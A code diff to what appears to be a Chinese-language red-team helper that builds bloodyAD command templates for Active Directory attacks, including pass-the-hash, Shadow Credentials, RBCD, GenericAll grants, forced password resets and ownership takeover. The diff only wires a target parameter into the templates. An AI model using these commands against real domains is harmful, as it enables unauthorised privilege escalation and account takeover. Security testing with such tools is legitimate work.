@@ -67,7 +67,7 @@ bloodyAD 对应命令:
         title: '全局用法: 哈希认证 (Pass-the-Hash)',
         description: '-p 直接接受 LMHASH:NTHASH 格式，无需明文密码',
         build: (p) =>
-          `bloodyAD -d ${v(p.domain, 'DOMAIN')} -u ${v(p.username, 'USER')} -p ${p.lmHash?.trim() || 'aad3b435b51404eeaad3b435b51404ee'}:${v(p.ntHash, 'NTHASH')} -H ${v(p.dcFQDN || p.dcIP, 'DC_HOST')} get object ${v('', 'TARGET')}`,
+          `bloodyAD -d ${v(p.domain, 'DOMAIN')} -u ${v(p.username, 'USER')} -p ${p.lmHash?.trim() || 'aad3b435b51404eeaad3b435b51404ee'}:${v(p.ntHash, 'NTHASH')} -H ${v(p.dcFQDN || p.dcIP, 'DC_HOST')} get object ${v(p.targetObject, 'TARGET')}`,
         usage: `语法: bloodyAD -d <域名> -u <用户名> -p <LMHASH:NTHASH> -H <DC主机> <类别> <子命令>
 -p 接受 LMHASH:NTHASH 格式做 NTLM Pass-the-Hash
 没有 LM 哈希时用空占位 aad3b435b51404eeaad3b435b51404ee
@@ -190,7 +190,7 @@ data: 记录数据，多数类型为目标主机名或 IP；TXT 类型可为文�
         title: 'add genericAll —— 授予完全控制',
         description: '给 trustee 在目标及后代对象上加 GenericAll (需对目标有 WriteDacl 或所有权)',
         build: (p) =>
-          `${buildBloodyADAuth(p)} add genericAll ${v('', 'TARGET')} ${v('', 'TRUSTEE')}`,
+          `${buildBloodyADAuth(p)} add genericAll ${v(p.targetObject, 'TARGET')} ${v('', 'TRUSTEE')}`,
         usage: `语法: add genericAll <target> <trustee>
 target: 目标对象的 sAMAccountName/DN/SID
 trustee: 获得完全控制的对象 sAMAccountName/DN/SID
@@ -204,7 +204,7 @@ trustee: 获得完全控制的对象 sAMAccountName/DN/SID
         title: 'add groupMember —— 添加组成员',
         description: '把用户/组/计算机加入目标组 (需对组有写成员权限)',
         build: (p) =>
-          `${buildBloodyADAuth(p)} add groupMember ${v('', 'GROUP')} ${v('', 'MEMBER')}`,
+          `${buildBloodyADAuth(p)} add groupMember ${v(p.targetObject, 'GROUP')} ${v('', 'MEMBER')}`,
         usage: `语法: add groupMember <group> <member>
 group: 目标组的 sAMAccountName/DN/SID
 member: 待加入成员 (用户/组/计算机) 的 sAMAccountName/DN/SID
@@ -218,7 +218,7 @@ member: 待加入成员 (用户/组/计算机) 的 sAMAccountName/DN/SID
         title: 'add rbcd —— 配置基于资源的约束委派',
         description: '在目标的 msDS-AllowedToActOnBehalfOfOtherIdentity 上授权服务账户 (RBCD 攻击核心)',
         build: (p) =>
-          `${buildBloodyADAuth(p)} add rbcd ${v('', 'TARGET')} ${v('', 'SERVICE_ACCOUNT')}`,
+          `${buildBloodyADAuth(p)} add rbcd ${v(p.targetObject, 'TARGET')} ${v('', 'SERVICE_ACCOUNT')}`,
         usage: `语法: add rbcd <target> <service>
 target: 目标计算机的 sAMAccountName/DN/SID
 service: 被授权的服务账户 (通常是自建的机器账户) 的 sAMAccountName/DN/SID
@@ -232,7 +232,7 @@ service: 被授权的服务账户 (通常是自建的机器账户) 的 sAMAccoun
         title: 'add shadowCredentials —— Shadow Credentials 攻击',
         description: '向目标的 msDS-KeyCredentialLink 写入密钥凭据并直接用 PKINIT 换回 TGT 与 NT 哈希',
         build: (p) =>
-          `${buildBloodyADAuth(p)} add shadowCredentials ${v('', 'TARGET')}`,
+          `${buildBloodyADAuth(p)} add shadowCredentials ${v(p.targetObject, 'TARGET')}`,
         usage: `语法: add shadowCredentials <target> [--path <路径>] [--stealth]
 target: 目标用户/计算机的 sAMAccountName/DN/SID
 --path: 生成凭据的保存路径 (TGT ccache，PKINIT 失败时为 pfx)，默认当前目录
@@ -247,7 +247,7 @@ target: 目标用户/计算机的 sAMAccountName/DN/SID
         title: 'add uac —— 添加 UAC 属性标志',
         description: '修改 userAccountControl 标志，如 DONT_REQ_PREAUTH (AS-REP roasting)',
         build: (p) =>
-          `${buildBloodyADAuth(p)} add uac ${v('', 'TARGET')} -f ${v('', 'FLAG')}`,
+          `${buildBloodyADAuth(p)} add uac ${v(p.targetObject, 'TARGET')} -f ${v('', 'FLAG')}`,
         usage: `语法: add uac <target> [-f <FLAG> ...]
 target: 目标用户/计算机的 sAMAccountName/DN/SID
 -f: 要添加的属性标志名，可多次指定 (如 -f DONT_REQ_PREAUTH -f DONT_EXPIRE_PASSWORD)
@@ -295,7 +295,7 @@ newpass: 新用户密码
         id: 'bloodyad-get-children',
         title: 'get children —— 列出子对象',
         description: '列出目标对象下的子对象，可按 objectClass 过滤',
-        build: (p) => `${buildBloodyADAuth(p)} get children --target ${v('', 'TARGET')}`,
+        build: (p) => `${buildBloodyADAuth(p)} get children --target ${v(p.targetObject, 'TARGET')}`,
         usage: `语法: get children [--target <目标>] [--otype <类型>] [--direct]
 --target: 目标对象 sAMAccountName/DN/SID (默认整个域)
 --otype: 特殊关键字 "useronly" 或 objectClass 过滤 (computer/group/trustedDomain/organizationalUnit/container/groupPolicyContainer/msDS-GroupManagedServiceAccount 等，默认 *)
@@ -321,7 +321,7 @@ newpass: 新用户密码
         id: 'bloodyad-get-membership',
         title: 'get membership —— 查询组成员关系',
         description: '返回目标所属所有组的 SID 与 sAMAccountName',
-        build: (p) => `${buildBloodyADAuth(p)} get membership ${v('', 'TARGET')}`,
+        build: (p) => `${buildBloodyADAuth(p)} get membership ${v(p.targetObject, 'TARGET')}`,
         usage: `语法: get membership <target> [--no-recurse]
 target: 目标对象的 sAMAccountName/DN/SID
 --no-recurse: 不递归，只列出直接所属的组
@@ -334,7 +334,7 @@ target: 目标对象的 sAMAccountName/DN/SID
         title: 'get object —— 读取对象属性',
         description: '读取目标对象 LDAP 属性，--resolve-sd 可解析安全描述符权限',
         build: (p) =>
-          `${buildBloodyADAuth(p)} get object ${v('', 'TARGET')} --attr ntSecurityDescriptor --resolve-sd`,
+          `${buildBloodyADAuth(p)} get object ${v(p.targetObject, 'TARGET')} --attr ntSecurityDescriptor --resolve-sd`,
         usage: `语法: get object <target> [--attr <属性列表>] [--resolve-sd] [--raw] [--transitive]
 target: 目标 sAMAccountName/DN/SID；空字符串 "" 打印 rootDSE
 --attr: 逗号分隔的属性列表，默认全部 (*)
@@ -407,7 +407,7 @@ target: 目标 sAMAccountName/DN/SID；空字符串 "" 打印 rootDSE
         title: 'set object —— 增/改/删对象属性',
         description: '通用属性修改: 改 SPN 做 targeted Kerberoasting、改 scriptPath 等',
         build: (p) =>
-          `${buildBloodyADAuth(p)} set object ${v('', 'TARGET')} ${v('', 'ATTRIBUTE')} -v ${v('', 'VALUE')}`,
+          `${buildBloodyADAuth(p)} set object ${v(p.targetObject, 'TARGET')} ${v('', 'ATTRIBUTE')} -v ${v('', 'VALUE')}`,
         usage: `语法: set object <target> <attribute> [-v <值> ...] [--raw] [--b64]
 target: 目标 sAMAccountName/DN/SID
 attribute: 属性名
@@ -423,7 +423,7 @@ attribute: 属性名
         title: 'set owner —— 夺取对象所有权',
         description: '修改对象所有者 (需 WriteOwner 权限)，拿下后可改 DACL',
         build: (p) =>
-          `${buildBloodyADAuth(p)} set owner ${v('', 'TARGET')} ${v('', 'NEW_OWNER')}`,
+          `${buildBloodyADAuth(p)} set owner ${v(p.targetObject, 'TARGET')} ${v('', 'NEW_OWNER')}`,
         usage: `语法: set owner <target> <owner>
 target: 目标对象的 sAMAccountName/DN/SID
 owner: 新所有者的 sAMAccountName/DN/SID
@@ -437,7 +437,7 @@ owner: 新所有者的 sAMAccountName/DN/SID
         title: 'set password —— 修改用户/计算机密码',
         description: '有 User-Force-Change-Password/GenericAll 时强制重置目标密码',
         build: (p) =>
-          `${buildBloodyADAuth(p)} set password ${v('', 'TARGET')} ${v('', 'NEWPASS')}`,
+          `${buildBloodyADAuth(p)} set password ${v(p.targetObject, 'TARGET')} ${v('', 'NEWPASS')}`,
         usage: `语法: set password <target> <newpass> [--oldpass <旧密码>] [--stealth]
 target: 目标用户/计算机的 sAMAccountName/DN/SID
 newpass: 新密码
@@ -451,7 +451,7 @@ newpass: 新密码
         id: 'bloodyad-set-restore',
         title: 'set restore —— 恢复已删除对象',
         description: '从 AD 回收站恢复被删除的对象',
-        build: (p) => `${buildBloodyADAuth(p)} set restore ${v('', 'TARGET')}`,
+        build: (p) => `${buildBloodyADAuth(p)} set restore ${v(p.targetObject, 'TARGET')}`,
         usage: `语法: set restore <target> [--newName <新名>] [--newParent <新父级DN>]
 target: 目标的 DN/sAMAccountName (GPO 用 name) 或 SID (有重名时避免用 sAMAccountName)
 --newName: 恢复后的新名称 (同时更新 sAMAccountName/UPN/SPN 等)，不给则用最后已知 RDN
@@ -503,7 +503,7 @@ data: 记录数据
         title: 'remove genericAll —— 移除完全控制',
         description: '移除 trustee 在目标上的 GenericAll ACE',
         build: (p) =>
-          `${buildBloodyADAuth(p)} remove genericAll ${v('', 'TARGET')} ${v('', 'TRUSTEE')}`,
+          `${buildBloodyADAuth(p)} remove genericAll ${v(p.targetObject, 'TARGET')} ${v('', 'TRUSTEE')}`,
         usage: `语法: remove genericAll <target> <trustee>
 target: 目标对象的 sAMAccountName/DN/SID
 trustee: 要移除完全控制的对象 sAMAccountName/DN/SID
@@ -516,7 +516,7 @@ trustee: 要移除完全控制的对象 sAMAccountName/DN/SID
         title: 'remove groupMember —— 移除组成员',
         description: '从组中移除用户/组/计算机',
         build: (p) =>
-          `${buildBloodyADAuth(p)} remove groupMember ${v('', 'GROUP')} ${v('', 'MEMBER')}`,
+          `${buildBloodyADAuth(p)} remove groupMember ${v(p.targetObject, 'GROUP')} ${v('', 'MEMBER')}`,
         usage: `语法: remove groupMember <group> <member>
 group: 目标组的 sAMAccountName/DN/SID
 member: 要移除的成员 (用户/组/计算机) 的 sAMAccountName/DN/SID
@@ -528,7 +528,7 @@ member: 要移除的成员 (用户/组/计算机) 的 sAMAccountName/DN/SID
         id: 'bloodyad-remove-object',
         title: 'remove object —— 删除对象',
         description: '删除用户/组/计算机/OU 等任意对象',
-        build: (p) => `${buildBloodyADAuth(p)} remove object ${v('', 'TARGET')}`,
+        build: (p) => `${buildBloodyADAuth(p)} remove object ${v(p.targetObject, 'TARGET')}`,
         usage: `语法: remove object <target>
 target: 目标对象 (用户/组/计算机/OU 等) 的 sAMAccountName/DN/SID
 用途: 清理攻击中创建的机器账户/后门账户 (如 remove object "EVILPC$")。`,
@@ -540,7 +540,7 @@ target: 目标对象 (用户/组/计算机/OU 等) 的 sAMAccountName/DN/SID
         title: 'remove rbcd —— 移除 RBCD 配置',
         description: '从目标上移除指定服务账户的 RBCD 条目',
         build: (p) =>
-          `${buildBloodyADAuth(p)} remove rbcd ${v('', 'TARGET')} ${v('', 'SERVICE_ACCOUNT')}`,
+          `${buildBloodyADAuth(p)} remove rbcd ${v(p.targetObject, 'TARGET')} ${v('', 'SERVICE_ACCOUNT')}`,
         usage: `语法: remove rbcd <target> <service>
 target: 目标对象的 sAMAccountName/DN/SID
 service: 服务账户的 sAMAccountName/DN/SID
@@ -552,7 +552,7 @@ service: 服务账户的 sAMAccountName/DN/SID
         id: 'bloodyad-remove-shadowcredentials',
         title: 'remove shadowCredentials —— 移除密钥凭据',
         description: '从目标的 msDS-KeyCredentialLink 移除 Key Credentials',
-        build: (p) => `${buildBloodyADAuth(p)} remove shadowCredentials ${v('', 'TARGET')}`,
+        build: (p) => `${buildBloodyADAuth(p)} remove shadowCredentials ${v(p.targetObject, 'TARGET')}`,
         usage: `语法: remove shadowCredentials <target> [--key <RSA密钥>]
 target: 目标的 sAMAccountName/DN/SID
 --key: 要移除的 Key Credential 的 RSA 密钥；不指定则移除全部
@@ -565,7 +565,7 @@ target: 目标的 sAMAccountName/DN/SID
         title: 'remove uac —— 移除 UAC 属性标志',
         description: '移除 userAccountControl 标志，如 LOCKOUT/ACCOUNTDISABLE',
         build: (p) =>
-          `${buildBloodyADAuth(p)} remove uac ${v('', 'TARGET')} -f ${v('', 'FLAG')}`,
+          `${buildBloodyADAuth(p)} remove uac ${v(p.targetObject, 'TARGET')} -f ${v('', 'FLAG')}`,
         usage: `语法: remove uac <target> [-f <FLAG> ...]
 target: 目标用户/计算机的 sAMAccountName/DN/SID
 -f: 要移除的属性标志名，可多次指定 (如 -f LOCKOUT -f ACCOUNTDISABLE)
@@ -621,7 +621,7 @@ query: LDAP 查询过滤器
         id: 'bloodyad-msldap-getsd',
         title: 'msldap getsd —— 读取安全描述符',
         description: '读取指定 DN 对象的安全描述符',
-        build: (p) => `${buildBloodyADAuth(p)} msldap getsd ${v('', 'TARGET_DN')}`,
+        build: (p) => `${buildBloodyADAuth(p)} msldap getsd ${v(p.targetObject, 'TARGET_DN')}`,
         usage: `语法: msldap getsd <dn> [--opts <选项>]
 dn: 目标对象 DN
 --opts: 附加选项 (默认空)
@@ -800,7 +800,7 @@ dn: 目标对象 DN
         title: 'msldap setsd —— 写入安全描述符',
         description: '用 SDDL 字符串整体替换目标对象的安全描述符',
         build: (p) =>
-          `${buildBloodyADAuth(p)} msldap setsd ${v('', 'TARGET_DN')} ${v('', 'SDDL')}`,
+          `${buildBloodyADAuth(p)} msldap setsd ${v(p.targetObject, 'TARGET_DN')} ${v('', 'SDDL')}`,
         usage: `语法: msldap setsd <target_dn> <sddl>
 target_dn: 目标对象 DN
 sddl: SDDL 格式的完整安全描述符字符串
@@ -893,7 +893,7 @@ newpass: 新密码
         title: 'msldap changeowner —— 修改对象所有者',
         description: '修改对象 (或其属性) 安全描述符中的所有者为指定 SID',
         build: (p) =>
-          `${buildBloodyADAuth(p)} msldap changeowner ${v('', 'NEW_OWNER_SID')} ${v('', 'TARGET_DN')}`,
+          `${buildBloodyADAuth(p)} msldap changeowner ${v('', 'NEW_OWNER_SID')} ${v(p.targetObject, 'TARGET_DN')}`,
         usage: `语法: msldap changeowner <new_owner_sid> <target_dn> [--target-attribute <属性>]
 new_owner_sid: 新所有者的 SID
 target_dn: 目标对象 DN
@@ -907,7 +907,7 @@ target_dn: 目标对象 DN
         title: 'msldap add_genericwrite —— 添加 GenericWrite ACE',
         description: '给目标对象添加指定用户的 GenericWrite ACE',
         build: (p) =>
-          `${buildBloodyADAuth(p)} msldap add_genericwrite ${v('', 'TARGET_DN')} ${v('', 'USER_DN')}`,
+          `${buildBloodyADAuth(p)} msldap add_genericwrite ${v(p.targetObject, 'TARGET_DN')} ${v('', 'USER_DN')}`,
         usage: `语法: msldap add_genericwrite <targetdn> <userdn>
 targetdn: 目标对象 DN
 userdn: 获得 GenericWrite 权限的用户 DN
@@ -919,7 +919,7 @@ userdn: 获得 GenericWrite 权限的用户 DN
         id: 'bloodyad-msldap-shadowcred',
         title: 'msldap shadowcred —— Shadow Credentials (msldap 版)',
         description: '执行 MSLDAPClientConsole 的 shadowcred 攻击',
-        build: (p) => `${buildBloodyADAuth(p)} msldap shadowcred ${v('', 'TARGET_USER')}`,
+        build: (p) => `${buildBloodyADAuth(p)} msldap shadowcred ${v(p.targetObject, 'TARGET_USER')}`,
         usage: `语法: msldap shadowcred <targetuser>
 targetuser: 目标用户
 攻击场景: 与 add shadowCredentials 相同的 msDS-KeyCredentialLink 攻击，走 msldap 引擎。`,
